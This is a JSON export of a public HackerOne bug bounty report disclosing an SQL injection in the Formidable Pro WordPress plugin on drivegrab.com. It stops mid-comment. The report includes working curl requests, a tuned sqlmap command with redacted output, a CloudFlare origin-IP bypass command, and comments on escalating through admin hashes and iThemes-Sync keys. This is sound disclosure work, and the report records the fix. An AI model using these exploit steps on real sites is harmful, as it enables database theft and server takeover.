{"id":273946,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNzM5NDY=","url":"https://hackerone.com/reports/273946","title":"www.drivegrab.com SQL injection","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2017-10-03T00:38:43.321Z","submitted_at":"2017-10-03T00:38:43.321Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jouko","url":"/jouko","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1659,"url":"https://hackerone.com/grab","handle":"grab","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/659/d5a2e407a772cb09a7ef57167580acf021c9c407_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/659/d5a2e407a772cb09a7ef57167580acf021c9c407_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Grab","twitter_handle":"GrabSG","website":"https://grab.com","about":"Grab is Southeast Asia's #1 ride-hailing app, food delivery service and cashless payment solution."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-11-17T06:28:15.090Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2017-11-17T06:24:35.931Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary:**\nThe website uses a WordPress plugin called Formidable Pro. I found an SQL injection in the plugin code.\n\n**Description:**\nThe plugin allows the site admin to create forms to be filled by users. For this end it implements some AJAX functions, including one to preview (or actually just view) a form. The functionality is probably intended for administrators to be used in the form design phase, but for some reason it is accessible to unauthenticated users.\n\nThe preview function accepts some parameters. Some of them allows the user to specify HTML and WordPress shortcodes (special WordPress markup) to be included with the preview. One of the shortcodes implemented by the Formidable Pro plugin contains an SQL injection vulnerability.\n\n## Browsers Verified In:\nN/A\n\n## Steps To Reproduce:\nVerifying the AJAX preview function with the cURL tool:\n~~~~\ncurl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview'\n~~~~\nThis request shows a preset \"contact us\" form (if form id is not defined, you'll get the first form in the database).\n\nThe preview AJAX request accepts some parameters. For example you can define HTML to be shown after the form:\n~~~~\ncurl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview\u0026after_html=hello world'\n~~~~\nYou see that \"hello world\" appears on the page after the \"Contact us\" form.\n\nThe HTML may contain WordPress shortcodes which are special markup in square brackets. There are shortcodes implemented by the WordPress core, and shortcodes implemented by plugins. Any of these can be included in the form preview.\n\nThe Formidable plugin implements several shortcodes. One of them is [display-frm-data] which displays data that people have entered in a form. It accepts a few parameters, e.g. the form id:\n\n~~~~\ncurl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview\u0026after_html=XXX[display-frm-data id=835]YYY'\n~~~~\n\nIn the resulting HTML you see some form entries between \"XXX\" and \"YYY\".\n\nThe [display-frm-data] shortcode also accepts parameters \"order_by\" and \"order\" for sorting the entries. The \"order_by\" parameter can contain a field ID or list of them. The \"order\" parameter is supposed to contain \"ASC\" or \"DESC\" to indicate the sorting direction. These parameters can be used to carry out an SQL injection.\n\nExample:\n~~~~\ncurl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview\u0026after_html=XXX[display-frm-data id=835 order_by=id limit=1 order=zzz]YYY'\n~~~~\n\nAlthough this example gives no meaningful output, you should see in the server logs that the \"zzz\" went in an SQL query which produced an error message.\n\nThe shortcode parameters are processed in various ways which makes it very complicated to perform a successful SQL query and retrieve data. However it is possible.\n\nThe injected code goes in the ORDER BY clause of an intermediate query that retrieves the list of form entry ID's. Results of the manipulated query aren't directly visible. The attacker can control the order of entries appearing on the page, which is enough to communicate one bit of data from the database.\n\nA further complication is that any comma symbols in the injected data are specially treated and affect the resulting SQL query in a way that creates errors. With careful formatting, however, the query can be salvaged.\n\nI came up with the following sqlmap options to retrieve any data from the database:\n~~~~\n./sqlmap.py -u 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview\u0026before_html=XXX[display-frm-data id=835 order_by=id limit=1 order=\"%2a( true=true )\"]XXX' --param-del ' ' -p true --dbms mysql --technique B --string persondetailstable --eval 'true=true.replace(\",\",\",-it.id%2b\");order_by=\"id,\"*true.count(\",\")+\"id\"'  --test-filter DUAL --tamper commalesslimit -D █████ --sql-query \"SELECT ██████████ FROM █████ WHERE id=2\"\n~~~~\nThis works with the latest sqlmap. The \"commalesslimit\" tamper module helps avoiding comma symbols in any LIMIT clauses. The --eval parameter does some processing to repair queries that contain commas in the SELECT clause.\n\nSpecifically, for each comma appearing in the order parameter, the plugin appends \",it.id\" in the query. The repair code appends \"-it.id+\" after each comma to neutralize the effect. In other words, an injected \"SELECT a,b\" query would be translated to \"SELECT a,it.id b\" by the shortcode logic. The repair code changes it to \"SELECT a, it.id-it.id+b\" which evaluates to the original injected query.\n\nResult of the above sqlmap command:\n~~~~\n[03:09:30] [INFO] testing █████\n[03:09:30] [INFO] confirming ██████\n[03:09:30] [INFO] the back-end DBMS is ███\nweb application technology: █████\nback-end DBMS: ███████\n[03:09:30] [INFO] fetching SQL SELECT statement query output: 'SELECT ███████ FROM ████ WHERE id=2'\n[03:09:30] [INFO] retrieved: 1\n[03:09:43] [INFO] retrieving the length of query output\n[03:09:43] [INFO] ███\n[03:10:46] [INFO] retrieved: █████             \nSELECT ██████ FROM ████ WHERE id=2 [1]:\n[*] ██████████\n~~~~\n\n## Supporting Material/References:\n\nAs a proof of concept I retrieved some data.\n\nTables in the database:\n~~~~\n[██████████]\n+---------------------------------+\n| █████████      |\n| █████████          |\n| █████████        |\n| ███████     |\n| ██████████ |\n| ███████         |\n| ██████████      |\n| ████ |\n| ██████████                |\n| ███                   |\n| ████████ |\n| █████████                 |\n| █████                  |\n| ███             |\n| █████████                  |\n| ███████ |\n| ███████         |\n| ██████████       |\n| ████             |\n| █████                  |\n| ██████████ |\n| ███                      |\n| █████                    |\n| ██████████                   |\n| ██████████                      |\n| ████████ |\n| █████████              |\n| ████                   |\n| ██████                      |\n| ████████                   |\n| ██████                      |\n+---------------------------------+\n~~~~\n\nAdministrator users and their password hashes:\n\n~~~~\n█████\n█████\n██████\n████████\n███\n█████\n████████\n~~~~\n\nWebroot path:\n~~~~\n███\n~~~~\n","vulnerability_information_html":"\u003cp\u003e\u003cstrong\u003eSummary:\u003c/strong\u003e\u003cbr\u003e\nThe website uses a WordPress plugin called Formidable Pro. I found an SQL injection in the plugin code.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDescription:\u003c/strong\u003e\u003cbr\u003e\nThe plugin allows the site admin to create forms to be filled by users. For this end it implements some AJAX functions, including one to preview (or actually just view) a form. The functionality is probably intended for administrators to be used in the form design phase, but for some reason it is accessible to unauthenticated users.\u003c/p\u003e\n\n\u003cp\u003eThe preview function accepts some parameters. Some of them allows the user to specify HTML and WordPress shortcodes (special WordPress markup) to be included with the preview. One of the shortcodes implemented by the Formidable Pro plugin contains an SQL injection vulnerability.\u003c/p\u003e\n\n\u003ch2 id=\"browsers-verified-in\"\u003eBrowsers Verified In:\u003c/h2\u003e\n\n\u003cp\u003eN/A\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cp\u003eVerifying the AJAX preview function with the cURL tool:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurl -s -i \u0026#39;https://www.drivegrab.com/wp-admin/admin-ajax.php\u0026#39; --data \u0026#39;action=frm_forms_preview\u0026#39;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis request shows a preset \u0026quot;contact us\u0026quot; form (if form id is not defined, you\u0026#39;ll get the first form in the database).\u003c/p\u003e\n\n\u003cp\u003eThe preview AJAX request accepts some parameters. For example you can define HTML to be shown after the form:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurl -s -i \u0026#39;https://www.drivegrab.com/wp-admin/admin-ajax.php\u0026#39; --data \u0026#39;action=frm_forms_preview\u0026amp;after_html=hello world\u0026#39;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eYou see that \u0026quot;hello world\u0026quot; appears on the page after the \u0026quot;Contact us\u0026quot; form.\u003c/p\u003e\n\n\u003cp\u003eThe HTML may contain WordPress shortcodes which are special markup in square brackets. There are shortcodes implemented by the WordPress core, and shortcodes implemented by plugins. Any of these can be included in the form preview.\u003c/p\u003e\n\n\u003cp\u003eThe Formidable plugin implements several shortcodes. One of them is [display-frm-data] which displays data that people have entered in a form. It accepts a few parameters, e.g. the form id:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurl -s -i \u0026#39;https://www.drivegrab.com/wp-admin/admin-ajax.php\u0026#39; --data \u0026#39;action=frm_forms_preview\u0026amp;after_html=XXX[display-frm-data id=835]YYY\u0026#39;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIn the resulting HTML you see some form entries between \u0026quot;XXX\u0026quot; and \u0026quot;YYY\u0026quot;.\u003c/p\u003e\n\n\u003cp\u003eThe [display-frm-data] shortcode also accepts parameters \u0026quot;order_by\u0026quot; and \u0026quot;order\u0026quot; for sorting the entries. The \u0026quot;order_by\u0026quot; parameter can contain a field ID or list of them. The \u0026quot;order\u0026quot; parameter is supposed to contain \u0026quot;ASC\u0026quot; or \u0026quot;DESC\u0026quot; to indicate the sorting direction. These parameters can be used to carry out an SQL injection.\u003c/p\u003e\n\n\u003cp\u003eExample:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurl -s -i \u0026#39;https://www.drivegrab.com/wp-admin/admin-ajax.php\u0026#39; --data \u0026#39;action=frm_forms_preview\u0026amp;after_html=XXX[display-frm-data id=835 order_by=id limit=1 order=zzz]YYY\u0026#39;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAlthough this example gives no meaningful output, you should see in the server logs that the \u0026quot;zzz\u0026quot; went in an SQL query which produced an error message.\u003c/p\u003e\n\n\u003cp\u003eThe shortcode parameters are processed in various ways which makes it very complicated to perform a successful SQL query and retrieve data. However it is possible.\u003c/p\u003e\n\n\u003cp\u003eThe injected code goes in the ORDER BY clause of an intermediate query that retrieves the list of form entry ID\u0026#39;s. Results of the manipulated query aren\u0026#39;t directly visible. The attacker can control the order of entries appearing on the page, which is enough to communicate one bit of data from the database.\u003c/p\u003e\n\n\u003cp\u003eA further complication is that any comma symbols in the injected data are specially treated and affect the resulting SQL query in a way that creates errors. With careful formatting, however, the query can be salvaged.\u003c/p\u003e\n\n\u003cp\u003eI came up with the following sqlmap options to retrieve any data from the database:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e./sqlmap.py -u \u0026#39;https://www.drivegrab.com/wp-admin/admin-ajax.php\u0026#39; --data \u0026#39;action=frm_forms_preview\u0026amp;before_html=XXX[display-frm-data id=835 order_by=id limit=1 order=\u0026quot;%2a( true=true )\u0026quot;]XXX\u0026#39; --param-del \u0026#39; \u0026#39; -p true --dbms mysql --technique B --string persondetailstable --eval \u0026#39;true=true.replace(\u0026quot;,\u0026quot;,\u0026quot;,-it.id%2b\u0026quot;);order_by=\u0026quot;id,\u0026quot;*true.count(\u0026quot;,\u0026quot;)+\u0026quot;id\u0026quot;\u0026#39;  --test-filter DUAL --tamper commalesslimit -D █████ --sql-query \u0026quot;SELECT ██████████ FROM █████ WHERE id=2\u0026quot;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis works with the latest sqlmap. The \u0026quot;commalesslimit\u0026quot; tamper module helps avoiding comma symbols in any LIMIT clauses. The --eval parameter does some processing to repair queries that contain commas in the SELECT clause.\u003c/p\u003e\n\n\u003cp\u003eSpecifically, for each comma appearing in the order parameter, the plugin appends \u0026quot;,it.id\u0026quot; in the query. The repair code appends \u0026quot;-it.id+\u0026quot; after each comma to neutralize the effect. In other words, an injected \u0026quot;SELECT a,b\u0026quot; query would be translated to \u0026quot;SELECT a,it.id b\u0026quot; by the shortcode logic. The repair code changes it to \u0026quot;SELECT a, it.id-it.id+b\u0026quot; which evaluates to the original injected query.\u003c/p\u003e\n\n\u003cp\u003eResult of the above sqlmap command:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e[03:09:30] [INFO] testing █████\n[03:09:30] [INFO] confirming ██████\n[03:09:30] [INFO] the back-end DBMS is ███\nweb application technology: █████\nback-end DBMS: ███████\n[03:09:30] [INFO] fetching SQL SELECT statement query output: \u0026#39;SELECT ███████ FROM ████ WHERE id=2\u0026#39;\n[03:09:30] [INFO] retrieved: 1\n[03:09:43] [INFO] retrieving the length of query output\n[03:09:43] [INFO] ███\n[03:10:46] [INFO] retrieved: █████             \nSELECT ██████ FROM ████ WHERE id=2 [1]:\n[*] ██████████\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cp\u003eAs a proof of concept I retrieved some data.\u003c/p\u003e\n\n\u003cp\u003eTables in the database:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e[██████████]\n+---------------------------------+\n| █████████      |\n| █████████          |\n| █████████        |\n| ███████     |\n| ██████████ |\n| ███████         |\n| ██████████      |\n| ████ |\n| ██████████                |\n| ███                   |\n| ████████ |\n| █████████                 |\n| █████                  |\n| ███             |\n| █████████                  |\n| ███████ |\n| ███████         |\n| ██████████       |\n| ████             |\n| █████                  |\n| ██████████ |\n| ███                      |\n| █████                    |\n| ██████████                   |\n| ██████████                      |\n| ████████ |\n| █████████              |\n| ████                   |\n| ██████                      |\n| ████████                   |\n| ██████                      |\n+---------------------------------+\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAdministrator users and their password hashes:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e█████\n█████\n██████\n████████\n███\n█████\n████████\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWebroot path:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e███\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","bounty_amount":"4500.0","formatted_bounty":"$4,500","weakness":{"id":67,"name":"SQL Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":164,"voters":["jin","jokebookservice1","arkaic","putsi","smsecurity","sp1d3rs","jensec","rhynorater","sultancad","jr0ch17","and 154 more..."],"severity":{"rating":"high","author_type":"Team"},"structured_scope":{"databaseId":1678,"asset_type":"URL","asset_identifier":"drivegrab.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2039843,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"One more thing: www.drivegrab.com is served through CloudFlare. The host \"████████\" resolves to ██████ which appears to be the real IP of the website. If CloudFlare is used to prevent DoS or other attacks, this may be a problem. It can also expose the server to other attacks. I won't report this separately.\n\nThe IP can be verified with:\n~~~~\ncurl -k -s -i 'https://██████████/' -H 'Host: www.drivegrab.com'\n~~~~\n","markdown_message":"\u003cp\u003eOne more thing: \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.drivegrab.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.drivegrab.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e is served through CloudFlare. The host \u0026quot;████████\u0026quot; resolves to ██████ which appears to be the real IP of the website. If CloudFlare is used to prevent DoS or other attacks, this may be a problem. It can also expose the server to other attacks. I won\u0026#39;t report this separately.\u003c/p\u003e\n\n\u003cp\u003eThe IP can be verified with:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurl -k -s -i \u0026#39;https://██████████/\u0026#39; -H \u0026#39;Host: www.drivegrab.com\u0026#39;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2017-10-03T00:42:49.702Z","updated_at":"2017-11-15T07:09:29.418Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2039851,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi Jouko\n\nWe have reviewed your bug report and would like to inform you that your submission is valid. We would request you give us some time while our teams are working on the fix. We will update you once the issue has been fixed so that you can verify the same.\n\nWe appreciate your help in keeping Grab and our customers safe and secure.","markdown_message":"\u003cp\u003eHi Jouko\u003c/p\u003e\n\n\u003cp\u003eWe have reviewed your bug report and would like to inform you that your submission is valid. We would request you give us some time while our teams are working on the fix. We will update you once the issue has been fixed so that you can verify the same.\u003c/p\u003e\n\n\u003cp\u003eWe appreciate your help in keeping Grab and our customers safe and secure.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-03T00:44:53.292Z","updated_at":"2017-10-03T00:44:53.292Z","actor":{"username":"nozz_","cleared":false,"url":"/nozz_","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Pav4PNZrRD6jcjSGBPe7jAW5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2039912,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"About your CloudFlare misconfiguration which leads to real IP disclosure could you please create another hackerone submission ? We would like to evaluate the impact of each of your findings separately.\n\nThank you","markdown_message":"\u003cp\u003eAbout your CloudFlare misconfiguration which leads to real IP disclosure could you please create another hackerone submission ? We would like to evaluate the impact of each of your findings separately.\u003c/p\u003e\n\n\u003cp\u003eThank you\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-03T01:26:23.536Z","updated_at":"2017-10-03T01:26:23.536Z","actor":{"username":"nozz_","cleared":false,"url":"/nozz_","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Pav4PNZrRD6jcjSGBPe7jAW5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2039923,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"ok","markdown_message":"\u003cp\u003eok\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-03T01:33:07.802Z","updated_at":"2017-10-03T01:33:07.802Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2040217,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"As for the fix, the most obvious would seem to be removing this:\n~~~~\nadd_action('wp_ajax_nopriv_frm_forms_preview', 'FrmFormsController::preview);\n~~~~\nIt's located in FrmHooksController.php. I haven't used this software apart from this testing, so I can't guarantee this change wouldn't break anything. But I don't know why an unauthenticated user would need to \"preview\" a form, as it sounds like something only administrators do while creating the forms.\n\nI think it would prevent this and some other problems (e.g. XSS in another report). That AJAX function opens a lot of attack surface because there are many shortcodes an attacker could try to exploit. Some of them seem bad. There are shortcodes that probably display non-public data from the entries database.\n\nThere is another SQL injection in another shortcode. It's in the LIMIT clause and I'm not sure if it's exploitable. Maybe I should report these in separate bug reports after checking them through.\n\nThere are many other wp_ajax_nopriv_ hooks which may be dangerous too. Some of them are probably necessary so it's not a good idea to remove them without careful testing.\n","markdown_message":"\u003cp\u003eAs for the fix, the most obvious would seem to be removing this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eadd_action(\u0026#39;wp_ajax_nopriv_frm_forms_preview\u0026#39;, \u0026#39;FrmFormsController::preview);\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIt\u0026#39;s located in FrmHooksController.php. I haven\u0026#39;t used this software apart from this testing, so I can\u0026#39;t guarantee this change wouldn\u0026#39;t break anything. But I don\u0026#39;t know why an unauthenticated user would need to \u0026quot;preview\u0026quot; a form, as it sounds like something only administrators do while creating the forms.\u003c/p\u003e\n\n\u003cp\u003eI think it would prevent this and some other problems (e.g. XSS in another report). That AJAX function opens a lot of attack surface because there are many shortcodes an attacker could try to exploit. Some of them seem bad. There are shortcodes that probably display non-public data from the entries database.\u003c/p\u003e\n\n\u003cp\u003eThere is another SQL injection in another shortcode. It\u0026#39;s in the LIMIT clause and I\u0026#39;m not sure if it\u0026#39;s exploitable. Maybe I should report these in separate bug reports after checking them through.\u003c/p\u003e\n\n\u003cp\u003eThere are many other wp_ajax_nopriv_ hooks which may be dangerous too. Some of them are probably necessary so it\u0026#39;s not a good idea to remove them without careful testing.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-03T05:22:33.337Z","updated_at":"2017-10-03T05:22:56.214Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2040344,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello again @jouko.\n\nCould you please help us to verify the fix for your 3 submissions related to `Formidable Pro` plugin  ?","markdown_message":"\u003cp\u003eHello again \u003ca href=\"/jouko\"\u003e@jouko\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eCould you please help us to verify the fix for your 3 submissions related to \u003ccode\u003eFormidable Pro\u003c/code\u003e plugin  ?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-03T07:31:38.669Z","updated_at":"2017-10-03T07:31:38.669Z","actor":{"username":"nozz_","cleared":false,"url":"/nozz_","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Pav4PNZrRD6jcjSGBPe7jAW5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2040373,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, the unauthenticated frm_forms_preview AJAX call seems to be disabled now so the exploits using it are no longer possible.","markdown_message":"\u003cp\u003eYes, the unauthenticated frm_forms_preview AJAX call seems to be disabled now so the exploits using it are no longer possible.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-03T08:25:54.573Z","updated_at":"2017-10-03T08:25:54.573Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2052585,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2017-10-09T02:52:01.708Z","updated_at":"2017-10-09T02:52:01.708Z","additional_data":{"old_severity":"Critical","new_severity":"Medium","old_severity_id":80278,"new_severity_id":81711},"actor":{"username":"nozz_","cleared":false,"url":"/nozz_","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Pav4PNZrRD6jcjSGBPe7jAW5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2052586,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2017-10-09T02:52:12.182Z","updated_at":"2017-10-09T02:52:12.182Z","additional_data":{"old_severity":"Medium","new_severity":"High","old_severity_id":81711,"new_severity_id":81712},"actor":{"username":"nozz_","cleared":false,"url":"/nozz_","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Pav4PNZrRD6jcjSGBPe7jAW5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2052587,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for working with us and helping us in resolving this issue.\nYour bounty will be processed shortly.","markdown_message":"\u003cp\u003eThank you for working with us and helping us in resolving this issue.\u003cbr\u003e\nYour bounty will be processed shortly.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-09T02:52:17.781Z","updated_at":"2017-10-09T02:52:17.781Z","actor":{"username":"nozz_","cleared":false,"url":"/nozz_","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Pav4PNZrRD6jcjSGBPe7jAW5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"jouko","url":"/jouko"},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2053341,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It is a little surprising that the severity is changing between critical, medium and high.\n\nThis bug gives the attacker all information stored in the database, including the list of drivers and their details. There are also many ways to escalate this to server-side code execution. One way is to crack the administrator passwords. If they aren't crackable, there are many other ways.\n\nOne example is via the iThemes-Sync plugin that was active on the server. It stores iThemes authentication keys in the WordPress database (table \"█████████\" in this case). They can be easily retrieved with the SQL injection.\n\nWith an iThemes-Sync authentication key, the attacker can execute any code on the server. It has functions for e.g. installing new plugins or adding new WordPress users.\n\nI didn't demonstrate these escalations because I thought it's more important to report critical bugs as quickly as possible and I thought you'd recognize the severity of the issue.\n","markdown_message":"\u003cp\u003eIt is a little surprising that the severity is changing between critical, medium and high.\u003c/p\u003e\n\n\u003cp\u003eThis bug gives the attacker all information stored in the database, including the list of drivers and their details. There are also many ways to escalate this to server-side code execution. One way is to crack the administrator passwords. If they aren\u0026#39;t crackable, there are many other ways.\u003c/p\u003e\n\n\u003cp\u003eOne example is via the iThemes-Sync plugin that was active on the server. It stores iThemes authentication keys in the WordPress database (table \u0026quot;█████████\u0026quot; in this case). They can be easily retrieved with the SQL injection.\u003c/p\u003e\n\n\u003cp\u003eWith an iThemes-Sync authentication key, the attacker can execute any code on the server. It has functions for e.g. installing new plugins or adding new WordPress users.\u003c/p\u003e\n\n\u003cp\u003eI didn\u0026#39;t demonstrate these escalations because I thought it\u0026#39;s more important to report critical bugs as quickly as possible and I thought you\u0026#39;d recognize the severity of the issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-09T13:40:19.572Z","updated_at":"2017-11-15T07:00:10.696Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2053381,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Also, do you object to me reporting these bugs to 